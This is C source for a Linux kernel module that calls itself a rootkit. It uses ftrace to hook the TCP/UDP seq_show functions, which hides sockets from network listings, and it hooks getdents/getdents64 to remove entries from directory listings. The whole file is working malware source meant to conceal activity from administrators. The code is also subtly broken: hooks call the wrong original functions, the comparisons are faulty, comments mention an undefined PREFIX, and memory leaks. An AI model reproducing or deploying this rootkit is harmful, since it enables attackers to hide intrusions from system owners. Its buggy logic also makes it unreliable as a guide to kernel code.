#include "ftrace_helper.h"
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <net/sock.h>

#define CURRENT_DIR "."
#define PARENT_DIR ".."

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ahmad Khalid Karimzai");
MODULE_DESCRIPTION("directories and files and open ports of tcp/v4 tcp/v6 udp/4 udp/6");

/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq,
												void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq,
												void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq,
												void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq,
												void *v);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct inet_sock	*is;
	struct sock			*sk;
	long				ret;

	if (v != SEQ_START_TOKEN)
	{
		is = (struct inet_sock *)v;
		sk = (struct sock *)&is->sk;
		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				ntohs(is->inet_sport),
				ntohs(is->inet_dport));
			return (0);
	}
	ret = orig_udp4_seq_show(seq, v);
	return (ret);
}

static asmlinkage long hook_udp6_seq_show(struct seq_file *seq, void *v)
{
	struct inet_sock	*is;
	struct sock			*sk;
	long				ret;

	if (v != SEQ_START_TOKEN)
	{
		is = (struct inet_sock *)v;
		sk = (struct sock *)&is->sk;
		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				ntohs(is->inet_sport),
				ntohs(is->inet_dport));
			return (0);
	}
	ret = orig_udp6_seq_show(seq, v);
	return (ret);
}

static asmlinkage long hook_udp4_seq_show(struct seq_file *seq, void *v)
{
	struct inet_sock	*is;
	struct sock			*sk;
	long				ret;

	if (v != SEQ_START_TOKEN)
	{
		is = (struct inet_sock *)v;
		sk = (struct sock *)&is->sk;
		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				ntohs(is->inet_sport),
				ntohs(is->inet_dport));
			return (0);
	}
	ret = orig_tcp4_seq_show(seq, v);
	return (ret);
}

static asmlinkage long	hook_tcp6_seq_show(struct seq_file *seq, void *v)
{
	struct inet_sock	*is;
	struct sock			*sk;
	long				ret;

	if (v != SEQ_START_TOKEN)
	{
		is = (struct inet_sock *)v;
		sk = (struct sock *)&is->sk;
		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				ntohs(is->inet_sport),
				ntohs(is->inet_dport));
		return (0);
	}
	ret = orig_tcp6_seq_show(seq, v);
	return (ret);
}

asmlinkage int	hacked_getdents64(const struct pt_regs *regs)
{
	long			error;
	unsigned long	offset;
	int				ret;

	/* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
	// int fd = regs->di;
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	// int count = regs->dx;
	/* We will need these intermediate structures for looping through the directory listing */
	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	offset = 0;
	/* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
	ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	if ((ret <= 0) || (dirent_ker == NULL))
		return (ret);
	/* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
    
	* dirent_ker is our copy of the returned dirent struct that we can play with */
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error == 0)
	{
		/* We iterate over offset,
			incrementing by current_dir->d_reclen each loop */
		while (offset < ret)
		{
			/* First, we look at dirent_ker + 0,
				which is the first entry in the directory listing */
			current_dir = (void *)dirent_ker + offset;
			/* Compare current_dir->d_name to PREFIX */
			if (memcmp(current_dir->d_name, CURRENT_DIR,
					strlen(CURRENT_DIR)) != 0 ||
				memcmp(current_dir->d_name, PARENT_DIR,
						strlen(PARENT_DIR) != 0))
			{
				/* If PREFIX is contained in the first struct in the list,
					then we have to shift everything else up by it's size */
				if (current_dir == dirent_ker)
				{
					ret -= current_dir->d_reclen;
					memmove(current_dir, (void *)current_dir
							+ current_dir->d_reclen, ret);

					continue ;
				}
				/* This is the crucial step: we add the length of the current directory to that of the 
				* previous one. This means that when the directory structure is looped over to print/search
				* the contents,
					the current directory is subsumed into that of whatever preceeds it. */
				previous_dir->d_reclen += current_dir->d_reclen;
			}
			else
			{
				/* If we end up here,
					then we didn't find PREFIX in current_dir->d_name 
				* We set previous_dir to the current_dir before moving on and incrementing
				* current_dir at the start of the loop */
				previous_dir = current_dir;
			}
			/* Increment offset by current_dir->d_reclen, when it equals ret,
				then we've scanned the whole
			* directory listing */
			offset += current_dir->d_reclen;
		}
		error = copy_to_user(dirent, dirent_ker, ret);
	}
	/* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
    
	* Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
	if (error != 0)
	{
		/* Clean up and return whatever is left of the directory listing to the user */
		kfree(dirent_ker);
	}
	return (ret);
}

asmlinkage int	hacked_getdents(const struct pt_regs *regs)
{
	long			error;
	unsigned long	offset;
	int				ret;

	/* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
	// int fd = regs->di;
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	// int count = regs->dx;
	/* We will need these intermediate structures for looping through the directory listing */
	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	offset = 0;
	/* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
	ret = orig_getdents(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	if ((ret <= 0) || (dirent_ker == NULL))
		return (ret);
	/* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
    
	* dirent_ker is our copy of the returned dirent struct that we can play with */
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error == 0)
	{
		/* We iterate over offset,
			incrementing by current_dir->d_reclen each loop */
		while (offset < ret)
		{
			/* First, we look at dirent_ker + 0,
				which is the first entry in the directory listing */
			current_dir = (void *)dirent_ker + offset;
			/* Compare current_dir->d_name to PREFIX */
			if (memcmp(current_dir->d_name, CURRENT_DIR,
					strlen(CURRENT_DIR)) != 0 ||
				memcmp(current_dir->d_name, PARENT_DIR,
						strlen(PARENT_DIR) != 0))
			{
				/* If PREFIX is contained in the first struct in the list,
					then we have to shift everything else up by it's size */
				if (current_dir == dirent_ker)
				{
					ret -= current_dir->d_reclen;
					memmove(current_dir, (void *)current_dir
							+ current_dir->d_reclen, ret);

					continue ;
				}
				/* This is the crucial step: we add the length of the current directory to that of the 
				* previous one. This means that when the directory structure is looped over to print/search
				* the contents,
					the current directory is subsumed into that of whatever preceeds it. */
				previous_dir->d_reclen += current_dir->d_reclen;
			}
			else
			{
				/* If we end up here,
					then we didn't find PREFIX in current_dir->d_name 
				* We set previous_dir to the current_dir before moving on and incrementing
				* current_dir at the start of the loop */
				previous_dir = current_dir;
			}
			/* Increment offset by current_dir->d_reclen, when it equals ret,
				then we've scanned the whole
			* directory listing */
			offset += current_dir->d_reclen;
		}
		error = copy_to_user(dirent, dirent_ker, ret);
	}
	/* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
    
	* Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
	if (error != 0)
	{
		/* Clean up and return whatever is left of the directory listing to the user */
		kfree(dirent_ker);
	}
	return (ret);
}

/* We are going to use the fh_install_hooks() function from ftrace_helper.h
 * in the module initialization function. This function takes an array of 
 * ftrace_hook structs, so we initialize it with what we want to hook
 * */
static struct ftrace_hook	hooks[] = {
	{
		.name = ("udp4_seq_show"),
		.function = (hook_udp4_seq_show),
		.original = &(orig_udp4_seq_show)
	},
	{
		.name = ("udp6_seq_show"),
		.function = (hook_udp6_seq_show),
		.original = &(orig_udp6_seq_show)
	},
	{
		.name = ("tcp4_seq_show"),
		.function = (hook_tcp4_seq_show),
		.original = &(orig_tcp4_seq_show),
	},
	{
		.name = ("tcp6_seq_show"),
		.function = (hook_tcp6_seq_show),
		.original = &(orig_tcp6_seq_show),
	},
	{
		.name = ("__x64_sys_getdents64"),
		.function = (hacked_getdents64),
		.original = &(orig_getdents64),
	},
	{
		.name = ("__x64_sys_getdents"),
		.function = (hacked_getdents),
		.original = &(orig_getdents),
	},
};

/* Module initialization function */
static int __init	rootkit_init(void)
{
	int	err;

	/* Simply call fh_install_hooks() with hooks (defined above) */
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err)
		return (err);
	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	return (0);
}

static void __exit	rootkit_exit(void)
{
	/* Simply call fh_remove_hooks() with hooks (defined above) */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
